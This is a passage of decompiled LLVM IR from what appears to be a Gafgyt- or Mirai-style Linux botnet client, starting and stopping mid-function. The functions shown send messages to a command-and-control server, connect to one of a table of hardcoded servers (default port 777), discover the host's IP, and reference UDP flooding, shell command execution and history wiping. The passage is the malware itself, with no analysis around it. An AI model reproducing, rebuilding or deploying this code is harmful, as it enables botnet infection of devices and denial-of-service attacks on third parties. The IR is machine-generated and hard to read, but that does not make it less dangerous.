  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804ea81 ], [ 0, %dec_label_pc_804ea84.preheader ]
  %storemerge46 = phi i32 [ %v4_804ea81, %dec_label_pc_804ea81 ], [ 0, %dec_label_pc_804ea84.preheader ]
  store i32 0, i32* @edi, align 4
  %v0_804ea98 = load i32, i32* @global_var_8061588.34, align 8
  %v0_804ea9d = load i32, i32* @global_var_806158c.35, align 4
  store i32 %v0_804ea9d, i32* %edx.global-to-local, align 4
  %v10_804eab5 = icmp ne i32 %v0_804ea9d, 0
  store i1 %v10_804eab5, i1* %cf.global-to-local, align 1
  br i1 %v10_804eab5, label %dec_label_pc_804ea2d, label %dec_label_pc_804eac1

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804ea84
  store i32 %v0_804ea98, i32* @esi, align 4
  %v10_804ead5 = icmp ult i32 %storemerge46, %v0_804ea98
  store i1 %v10_804ead5, i1* %cf.global-to-local, align 1
  br i1 %v10_804ead5, label %dec_label_pc_804ea2d, label %dec_label_pc_804eae1

dec_label_pc_804eae1:                             ; preds = %dec_label_pc_804eac1
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp251 = icmp slt i32 %stack_var_-28.1, 1
  %v0_804eb02 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804eb07 = load i32, i32* @esp, align 4
  br i1 %tmp251, label %dec_label_pc_804eb02, label %dec_label_pc_804eae7

dec_label_pc_804eae7:                             ; preds = %dec_label_pc_804eae1
  %v5_804eaec = icmp ult i32 %v0_804eb07, 4
  store i1 %v5_804eaec, i1* %cf.global-to-local, align 1
  store i32 %v0_804eb02, i32* %stack_var_-476, align 4
  %v2_804eaf8 = call i32 @sockprintf(i32 %v0_804eb02, i32 ptrtoint ([11 x i8]* @global_var_805f5ae.668 to i32))
  %v0_804eafd = load i32, i32* @esp, align 4
  %v2_804eafd = icmp ugt i32 %v0_804eafd, -17
  store i1 %v2_804eafd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb18

dec_label_pc_804eb02:                             ; preds = %dec_label_pc_804eae1
  %v5_804eb07 = icmp ult i32 %v0_804eb07, 8
  store i1 %v5_804eb07, i1* %cf.global-to-local, align 1
  store i32 %v0_804eb02, i32* %stack_var_-476, align 4
  %v2_804eb10 = call i32 @sockprintf(i32 %v0_804eb02, i32 ptrtoint ([13 x i8]* @global_var_805f5b9.669 to i32))
  %v0_804eb15 = load i32, i32* @esp, align 4
  %v2_804eb15 = icmp ugt i32 %v0_804eb15, -17
  store i1 %v2_804eb15, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb18

dec_label_pc_804eb18:                             ; preds = %dec_label_pc_804e9d2, %dec_label_pc_804eae7, %dec_label_pc_804eb02
  %v2_804eb1b = load i32, i32* %v1_804d7c2, align 4
  store i32 10, i32* %stack_var_-460, align 4
  store i1 false, i1* @df, align 1
  %v4_804eb38 = inttoptr i32 %v2_804eb1b to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_805f5c6.670 to i32), i32* @edi, align 4
  %v7_804eb4a = call i32 @_strncmp(i8* %v4_804eb38, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805f5c6.670, i32 0, i32 0), i32 10)
  %v8_804eb4a = urem i32 %v7_804eb4a, 2
  %v9_804eb4a = icmp eq i32 %v8_804eb4a, 0
  %v0_804eb4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb4c = or i1 %v0_804eb4c, %v9_804eb4a
  %v3_804eb4c = zext i1 %v2_804eb4c to i32
  %v4_804eb4c = load i32, i32* @edx, align 4
  %v5_804eb4c = and i32 %v4_804eb4c, -256
  %v6_804eb4c = or i32 %v3_804eb4c, %v5_804eb4c
  %v7_804eb4c = xor i32 %v6_804eb4c, 1
  store i32 %v7_804eb4c, i32* %edx.global-to-local, align 4
  %v1_804eb54 = trunc i32 %v7_804eb4c to i8
  %v3_804eb54 = zext i1 %v0_804eb4c to i8
  %v4_804eb54 = sub nsw i8 %v1_804eb54, %v3_804eb54
  %v15_804eb54 = icmp eq i8 %v4_804eb54, 0
  %v2_804eb58 = sext i8 %v4_804eb54 to i32
  store i32 %v2_804eb58, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb5d = icmp eq i1 %v15_804eb54, false
  br i1 %v1_804eb5d, label %dec_label_pc_804eb69, label %dec_label_pc_804eb5f

dec_label_pc_804eb5f:                             ; preds = %dec_label_pc_804eb18
  %v0_804eb5f = load i32, i32* @esp, align 4
  %v5_804eb5f = icmp ult i32 %v0_804eb5f, 12
  store i1 %v5_804eb5f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804eb64 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804eb69

dec_label_pc_804eb69:                             ; preds = %dec_label_pc_804e1e4, %dec_label_pc_804e230, %dec_label_pc_804e55c, %dec_label_pc_804eb18, %dec_label_pc_804e9a7, %dec_label_pc_804e835, %dec_label_pc_804e651, %dec_label_pc_804e250, %dec_label_pc_804de09, %dec_label_pc_804dd6c, %dec_label_pc_804dc3b, %dec_label_pc_804dbad, %dec_label_pc_804e8e1, %dec_label_pc_804e75e, %dec_label_pc_804e380, %dec_label_pc_804e0ae, %dec_label_pc_804df4e, %dec_label_pc_804de2a, %dec_label_pc_804dc70, %dec_label_pc_804daf0, %dec_label_pc_804da87, %dec_label_pc_804da25, %dec_label_pc_804eb5f
  %v0_804eb70 = phi i32 [ %v2_804e551, %dec_label_pc_804e55c ], [ %v2_804eb58, %dec_label_pc_804eb18 ], [ %v0_804e9a7, %dec_label_pc_804e9a7 ], [ %v0_804e835, %dec_label_pc_804e835 ], [ %v0_804e651, %dec_label_pc_804e651 ], [ %v0_804e250, %dec_label_pc_804e250 ], [ %v0_804de09, %dec_label_pc_804de09 ], [ 0, %dec_label_pc_804dd6c ], [ %v0_804dc3b, %dec_label_pc_804dc3b ], [ 0, %dec_label_pc_804dbad ], [ %v2_804e8ef, %dec_label_pc_804e8e1 ], [ %v2_804e76c, %dec_label_pc_804e75e ], [ %v2_804e38e, %dec_label_pc_804e380 ], [ %v2_804e0bc, %dec_label_pc_804e0ae ], [ %v2_804df6f, %dec_label_pc_804df4e ], [ %v1_804de16, %dec_label_pc_804de2a ], [ %v1_804dc48, %dec_label_pc_804dc70 ], [ %v1_804db0b, %dec_label_pc_804daf0 ], [ %v2_804da9c, %dec_label_pc_804da87 ], [ %v2_804da33, %dec_label_pc_804da25 ], [ %v1_804eb64, %dec_label_pc_804eb5f ], [ %v2_804e1f0, %dec_label_pc_804e1e4 ], [ %v2_804e23a, %dec_label_pc_804e230 ]
  %v2_804eb6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804eb6c, i32* @ebx, align 4
  store i32 %v0_804d7b7, i32* @esi, align 4
  store i32 %v0_804d7b6, i32* @edi, align 4
  ret i32 %v0_804eb70

; uselistorder directives
  uselistorder i1 %v0_804eb4c, { 1, 0 }
  uselistorder i32 %v0_804eb07, { 1, 0 }
  uselistorder i32 %v0_804eb02, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804ea98, { 1, 0 }
  uselistorder i32 %storemerge46, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804ea6e, { 1, 0 }
  uselistorder i32 %v2_804ea30, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804ea06, { 1, 0 }
  uselistorder i32 %v2_804e994, { 1, 0 }
  uselistorder i32 %v0_804e98a, { 1, 0 }
  uselistorder i32 %v2_804e924, { 1, 0 }
  uselistorder i32 %v2_804e90d, { 1, 0 }
  uselistorder i32 %v2_804e902, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804e8e1, { 1, 0 }
  uselistorder i1 %v5_804e8d1, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804e8cf, { 1, 0 }
  uselistorder i32 %v2_804e8b7, { 1, 0 }
  uselistorder i1 %v0_804e894, { 1, 0 }
  uselistorder i32 %v2_804e822, { 1, 0 }
  uselistorder i32 %v0_804e7fd, { 1, 0 }
  uselistorder i32 %v0_804e818, { 1, 0 }
  uselistorder i32 %storemerge48274, { 1, 0 }
  uselistorder i32 %v2_804e7a1, { 1, 0 }
  uselistorder i32 %v2_804e78a, { 1, 0 }
  uselistorder i32 %v2_804e77f, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804e75e, { 1, 0 }
  uselistorder i1 %v5_804e74e, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_804e74c, { 1, 0 }
  uselistorder i32 %v2_804e734, { 1, 0 }
  uselistorder i1 %v0_804e711, { 1, 0 }
  uselistorder i32 %v2_804e69a, { 1, 0 }
  uselistorder i1 %v5_804e67c, { 0, 2, 1 }
  uselistorder i32 %v2_804e67a, { 1, 0 }
  uselistorder i32 %v2_804e664, { 1, 0 }
  uselistorder i32 %v2_804e5ea, { 1, 0 }
  uselistorder i1 %v5_804e5cc, { 0, 2, 1 }
  uselistorder i32 %v2_804e5ca, { 1, 0 }
  uselistorder i32 %v2_804e5b4, { 1, 0 }
  uselistorder i1 %v5_804e58c, { 1, 0 }
  uselistorder i32 %v2_804e58a, { 1, 0, 2 }
  uselistorder i32 %v2_804e56c, { 1, 0 }
  uselistorder i32* %v1_804e56c, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804e545, { 1, 0 }
  uselistorder i32 %v7_804e543, { 1, 0 }
  uselistorder i32 %v2_804e4cb, { 1, 0 }
  uselistorder i32 %v0_804e4c1, { 1, 0 }
  uselistorder i1 %v5_804e463, { 1, 0 }
  uselistorder i32 %v2_804e437, { 1, 0 }
  uselistorder i32 %v2_804e402, { 1, 0 }
  uselistorder i32 %v2_804e3f1, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e3da, { 1, 0 }
  uselistorder i32 %v2_804e3c3, { 1, 0 }
  uselistorder i32 %v2_804e3ac, { 1, 0 }
  uselistorder i32 %v2_804e3a1, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804e380, { 1, 0 }
  uselistorder i32 %v2_804e36e, { 1, 0 }
  uselistorder i32 %v2_804e350, { 1, 0 }
  uselistorder i32 %v1_804e33f, { 1, 0 }
  uselistorder i32 %v1_804e337, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e331, { 1, 0 }
  uselistorder i32 %v2_804e318, { 1, 0 }
  uselistorder i1 %v5_804e301, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i32 %v2_804e2ff, { 1, 0 }
  uselistorder i32 %v2_804e2e2, { 1, 0 }
  uselistorder i1 %v0_804e2bb, { 1, 0 }
  uselistorder i32 %v2_804e23a, { 0, 2, 1 }
  uselistorder i1 %v5_804e1d2, { 1, 0 }
  uselistorder i32 %v2_804e1a6, { 1, 0 }
  uselistorder i32 %v1_804e177, { 2, 1, 0 }
  uselistorder i32 %v2_804e171, { 1, 0 }
  uselistorder i32 %v1_804e142, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e13c, { 1, 0 }
  uselistorder i32 %v1_804e125, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e11f, { 1, 0 }
  uselistorder i32 %v2_804e108, { 1, 0 }
  uselistorder i32 %v2_804e0f1, { 1, 0 }
  uselistorder i32 %v2_804e0da, { 1, 0 }
  uselistorder i32 %v2_804e0cf, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804e0ae, { 1, 0 }
  uselistorder i32 %v2_804e09c, { 1, 0 }
  uselistorder i1 %v8_804e090, { 1, 0, 2 }
  uselistorder i32 %v1_804e08b, { 1, 0 }
  uselistorder i32 %v1_804e083, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e07d, { 1, 0 }
  uselistorder i32 %v1_804e070, { 1, 0 }
  uselistorder i32 %v1_804e068, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e062, { 1, 0 }
  uselistorder i32 %v1_804e055, { 1, 0 }
  uselistorder i32 %v1_804e04d, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804e047, { 1, 0 }
  uselistorder i32 %v2_804e02e, { 1, 0 }
  uselistorder i32 %v2_804e011, { 1, 0 }
  uselistorder i1 %v5_804dff6, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804dff4, { 1, 0 }
  uselistorder i32 %v2_804dfd7, { 1, 0 }
  uselistorder i1 %v0_804dfb0, { 1, 0 }
  uselistorder i1 %v0_804df3b, { 1, 0 }
  uselistorder i32 %v0_804dee0, { 1, 0, 2 }
  uselistorder i1 %v0_804deb3, { 1, 0 }
  uselistorder i32 %v0_804de58, { 1, 0, 2 }
  uselistorder i1 %v0_804ddf6, { 1, 0 }
  uselistorder i32 %v0_804dd9d, { 1, 0, 2 }
  uselistorder i32 %v0_804dd6c, { 1, 0, 2 }
  uselistorder i1 %v0_804dd59, { 1, 0 }
  uselistorder i1 %v0_804dd0b, { 1, 0 }
  uselistorder i32 %v0_804dc9e, { 1, 0, 2 }
  uselistorder i1 %v0_804dc24, { 1, 0 }
  uselistorder i32 %v0_804dbcd, { 1, 0 }
  uselistorder i32 %v0_804dbad, { 1, 0, 2 }
  uselistorder i1 %v0_804db9a, { 1, 0 }
  uselistorder i1 %v0_804db4c, { 1, 0 }
  uselistorder i32 %v0_804daf0, { 1, 0 }
  uselistorder i1 %v0_804dadd, { 1, 0 }
  uselistorder i32 %v0_804da8c, { 1, 0, 2 }
  uselistorder i1 %v0_804da74, { 1, 0 }
  uselistorder i32 %v0_804da25, { 1, 0 }
  uselistorder i1 %v0_804da12, { 1, 0 }
  uselistorder i32 %v0_804d9c8, { 1, 0 }
  uselistorder i1 %v0_804d9a0, { 1, 0 }
  uselistorder i32 %v0_804d953, { 1, 0 }
  uselistorder i1 %v0_804d92b, { 1, 0 }
  uselistorder i32 %v0_804d8de, { 1, 0 }
  uselistorder i1 %v0_804d8b6, { 1, 0 }
  uselistorder i32 %v0_804d869, { 1, 0 }
  uselistorder i1 %v0_804d841, { 1, 0 }
  uselistorder i1 %v0_804d7f3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-460, { 21, 10, 3, 11, 4, 0, 1, 2, 5, 6, 7, 8, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22 }
  uselistorder i32* %stack_var_-476, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 0, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32 %tmp226, { 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 6, 3, 4, 1, 2, 0 }
  uselistorder i32 %tmp170, { 2, 16, 3, 15, 4, 14, 0, 13, 5, 6, 12, 7, 8, 1, 11, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 10, 9, 11, 12, 16, 13, 14, 15, 17, 18, 21, 19, 20, 22, 23, 24, 25, 27, 26, 28, 29, 30 }
  uselistorder i1* %cf.global-to-local, { 4, 5, 18, 6, 7, 8, 9, 10, 11, 17, 12, 13, 14, 15, 16, 19, 40, 20, 21, 22, 27, 23, 24, 25, 26, 3, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 63, 42, 43, 44, 50, 45, 46, 47, 48, 49, 1, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 83, 65, 66, 67, 68, 69, 70, 78, 71, 72, 73, 74, 75, 76, 77, 0, 79, 80, 81, 82, 84, 262, 85, 86, 87, 92, 88, 89, 90, 91, 263, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 261, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 163, 123, 124, 128, 125, 126, 127, 2, 129, 130, 131, 132, 133, 134, 135, 260, 136, 137, 259, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 164, 168, 165, 166, 167, 169, 175, 170, 171, 172, 173, 174, 176, 194, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 195, 212, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 213, 217, 214, 215, 216, 218, 221, 219, 220, 222, 225, 223, 224, 226, 255, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 256, 257, 258 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80579b1.223 to i32), { 8, 0, 7, 1, 6, 2, 5, 3, 9, 4, 10, 11 }
  uselistorder i32 ()* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb69, { 22, 3, 4, 12, 5, 13, 6, 2, 14, 7, 1, 0, 15, 16, 17, 8, 9, 18, 10, 11, 19, 20, 21 }
  uselistorder label %dec_label_pc_804eb18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ea84, { 1, 0 }
  uselistorder label %dec_label_pc_804ea81, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e9d2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e963, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e7e0, { 1, 0 }
  uselistorder label %dec_label_pc_804e75e, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e6dd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e5a5, { 1, 0 }
  uselistorder label %dec_label_pc_804e511, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804e48e, { 1, 0 }
  uselistorder label %dec_label_pc_804e457, { 1, 0 }
  uselistorder label %dec_label_pc_804e422, { 1, 0 }
  uselistorder label %dec_label_pc_804e39b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e380, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804e1fd, { 1, 0 }
  uselistorder label %dec_label_pc_804e1c6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e0ae, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804ddbf, { 1, 0 }
  uselistorder label %dec_label_pc_804dbed, { 1, 0 }
  uselistorder label %dec_label_pc_804d9de, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d969, { 1, 0 }
  uselistorder label %dec_label_pc_804d8f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d87f, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804eb7a = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804eb8e = bitcast i32* %stack_var_-4104 to i8*
  %v4_804eb8e = call i32 @__GI_memset(i8* %v3_804eb8e, i32 0, i32 4096)
  %v0_804eb96 = load i32, i32* @global_var_8061580.20, align 128
  %v1_804eb9b = icmp eq i32 %v0_804eb96, 0
  br i1 %v1_804eb9b, label %dec_label_pc_804ebba, label %dec_label_pc_804eb9f

dec_label_pc_804eb9f:                             ; preds = %entry
  %v1_804eba8 = call i32 @__libc_close(i32 %v0_804eb96)
  store i32 0, i32* @global_var_8061580.20, align 128
  br label %dec_label_pc_804ebba

dec_label_pc_804ebba:                             ; preds = %entry, %dec_label_pc_804eb9f
  %v0_804ebba = load i32, i32* @global_var_806119c.671, align 4
  %v1_804ebbf = icmp eq i32 %v0_804ebba, 0
  %v1_804ebc1 = icmp eq i1 %v1_804ebbf, false
  br i1 %v1_804ebc1, label %dec_label_pc_804ebcf, label %dec_label_pc_804ebda

dec_label_pc_804ebcf:                             ; preds = %dec_label_pc_804ebba
  %v1_804ebd4 = add i32 %v0_804ebba, 1
  br label %dec_label_pc_804ebda

dec_label_pc_804ebda:                             ; preds = %dec_label_pc_804ebba, %dec_label_pc_804ebcf
  %storemerge = phi i32 [ %v1_804ebd4, %dec_label_pc_804ebcf ], [ 0, %dec_label_pc_804ebba ]
  store i32 %storemerge, i32* @global_var_806119c.671, align 4
  %v1_804ebdf = mul i32 %storemerge, 4
  %v2_804ebdf = add i32 %v1_804ebdf, ptrtoint ([18 x i8]** @global_var_8061198.672 to i32)
  %v3_804ebdf = inttoptr i32 %v2_804ebdf to i32*
  %v4_804ebdf = load i32, i32* %v3_804ebdf, align 4
  store i32 %v4_804ebdf, i32* @eax, align 4
  %v3_804ebf1 = call i32 @strcpy(i8* %v3_804eb8e, i32 %v4_804ebdf)
  %v3_804ec0c = call i32 @__GI_strchr(i8* %v3_804eb8e, i32 58)
  %v1_804ec14 = icmp eq i32 %v3_804ec0c, 0
  br i1 %v1_804ec14, label %dec_label_pc_804ec53, label %dec_label_pc_804ec18

dec_label_pc_804ec18:                             ; preds = %dec_label_pc_804ebda
  %v3_804ec24 = call i32 @__GI_strchr(i8* %v3_804eb8e, i32 58)
  %v1_804ec2c = add i32 %v3_804ec24, 1
  %v1_804ec31 = call i32 @atol(i32 %v1_804ec2c)
  %v3_804ec48 = call i32 @__GI_strchr(i8* %v3_804eb8e, i32 58)
  %v4_804ec48 = inttoptr i32 %v3_804ec48 to i8*
  store i8 0, i8* %v4_804ec48, align 1
  br label %dec_label_pc_804ec53

dec_label_pc_804ec53:                             ; preds = %dec_label_pc_804ebda, %dec_label_pc_804ec18
  %stack_var_-8.0 = phi i32 [ 777, %dec_label_pc_804ebda ], [ %v1_804ec31, %dec_label_pc_804ec18 ]
  %v3_804ec5c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804ec5c, i32* @global_var_8061580.20, align 128
  %v4_804ec7c = call i32 @connectTimeout(i32 %v3_804ec5c, i32 %v2_804eb7a, i32 %stack_var_-8.0, i32 30)
  %v1_804ec84 = icmp eq i32 %v4_804ec7c, 0
  %. = zext i1 %v1_804ec84 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec53, { 1, 0 }
  uselistorder label %dec_label_pc_804ebda, { 1, 0 }
  uselistorder label %dec_label_pc_804ebba, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804ecb8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804ecc3 = icmp eq i32 %v5_804ecb8, -1
  %v1_804ecc7 = icmp eq i1 %v13_804ecc3, false
  br i1 %v1_804ecc7, label %dec_label_pc_804ecd8, label %dec_label_pc_804ee9b

dec_label_pc_804ecd8:                             ; preds = %entry
  %v2_804ecd8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804ed04 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805f5d0.673 to i32))
  %v2_804ed14 = call i32 @htons(i32 53)
  %v5_804ed2c = call i32 @__libc_connect(i32 %v5_804ecb8, i32 %v2_804ecd8, i32 16)
  %v13_804ed37 = icmp eq i32 %v5_804ed2c, -1
  %v1_804ed3b = icmp eq i1 %v13_804ed37, false
  br i1 %v1_804ed3b, label %dec_label_pc_804ed4c, label %dec_label_pc_804ee9b

dec_label_pc_804ed4c:                             ; preds = %dec_label_pc_804ecd8
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804ed53 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804ed59 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804ed61 = call i32 @__GI_getsockname(i32 %v5_804ecb8, i32 %v2_804ed53, i32 %v2_804ed59)
  %v13_804ed6c = icmp eq i32 %v5_804ed61, -1
  %v1_804ed70 = icmp eq i1 %v13_804ed6c, false
  br i1 %v1_804ed70, label %dec_label_pc_804ed81, label %dec_label_pc_804ee9b

dec_label_pc_804ed81:                             ; preds = %dec_label_pc_804ed4c
  %v5_804ed93 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805f5d8.674, i32 0, i32 0), i32 0)
  %v2_804edf6 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804ee0851 = call i32 @fdgets(i32 %v2_804edf6, i32 4096, i32 %v5_804ed93)
  %v1_804ee1052 = icmp eq i32 %v5_804ee0851, 0
  %v1_804ee1253 = icmp eq i1 %v1_804ee1052, false
  br i1 %v1_804ee1253, label %dec_label_pc_804eda0, label %dec_label_pc_804ee14

dec_label_pc_804eda0:                             ; preds = %dec_label_pc_804ed81, %dec_label_pc_804edda
  %v5_804edaf = call i32 @strstr(i32 %v2_804edf6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805f5e8.675, i32 0, i32 0))
  %v1_804edb7 = icmp eq i32 %v5_804edaf, 0
  br i1 %v1_804edb7, label %dec_label_pc_804edda, label %dec_label_pc_804edc9.preheader

dec_label_pc_804edc9.preheader:                   ; preds = %dec_label_pc_804eda0
  %v2_804edcc42 = load i8, i8* %stack_var_-4156, align 1
  %v10_804edce47 = icmp eq i8 %v2_804edcc42, 9
  %v1_804edd048 = icmp eq i1 %v10_804edce47, false
  br i1 %v1_804edd048, label %dec_label_pc_804edc6, label %dec_label_pc_804edd2

dec_label_pc_804edc6:                             ; preds = %dec_label_pc_804edc9.preheader, %dec_label_pc_804edc6
  %v4_804edc949 = phi i32 [ %v5_804edc6, %dec_label_pc_804edc6 ], [ %v2_804edf6, %dec_label_pc_804edc9.preheader ]
  %v5_804edc6 = add i32 %v4_804edc949, 1
  %v22_804edc6 = inttoptr i32 %v5_804edc6 to i8*
  %v2_804edcc = load i8, i8* %v22_804edc6, align 1
  %v10_804edce = icmp eq i8 %v2_804edcc, 9
  %v1_804edd0 = icmp eq i1 %v10_804edce, false
  br i1 %v1_804edd0, label %dec_label_pc_804edc6, label %dec_label_pc_804edd2

dec_label_pc_804edd2:                             ; preds = %dec_label_pc_804edc6, %dec_label_pc_804edc9.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804edc9.preheader ], [ %v22_804edc6, %dec_label_pc_804edc6 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804ee14

dec_label_pc_804edda:                             ; preds = %dec_label_pc_804eda0
  %v6_804edee = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804ee08 = call i32 @fdgets(i32 %v2_804edf6, i32 4096, i32 %v5_804ed93)
  %v1_804ee10 = icmp eq i32 %v5_804ee08, 0
  %v1_804ee12 = icmp eq i1 %v1_804ee10, false
  br i1 %v1_804ee12, label %dec_label_pc_804eda0, label %dec_label_pc_804ee14

dec_label_pc_804ee14:                             ; preds = %dec_label_pc_804ed81, %dec_label_pc_804edda, %dec_label_pc_804edd2
  %v2_804ee1a = call i32 @__libc_close(i32 %v5_804ed93)
  %v3_804ee22 = load i8, i8* %stack_var_-4156, align 1
  %v4_804ee28 = icmp eq i8 %v3_804ee22, 0
  br i1 %v4_804ee28, label %dec_label_pc_804ee8b, label %dec_label_pc_804ee2c

dec_label_pc_804ee2c:                             ; preds = %dec_label_pc_804ee14
  %v2_804ee36 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804ee36, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804ee3d = call i32 @strcpy(i8* %tmp39, i32 %v2_804edf6)
  %v5_804ee57 = call i32 @ioctl(i32 %v5_804ecb8, i32 35111, i32 %v2_804ee36)
  %v2_804ee71 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804ee68

dec_label_pc_804ee68:                             ; preds = %dec_label_pc_804ee2c, %dec_label_pc_804ee68
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804ee2c ], [ %v4_804ee82, %dec_label_pc_804ee68 ]
  %v2_804ee77 = add i32 %storemerge40, %v2_804ee71
  %v1_804ee7a = inttoptr i32 %v2_804ee77 to i8*
  %v2_804ee7a = load i8, i8* %v1_804ee7a, align 1
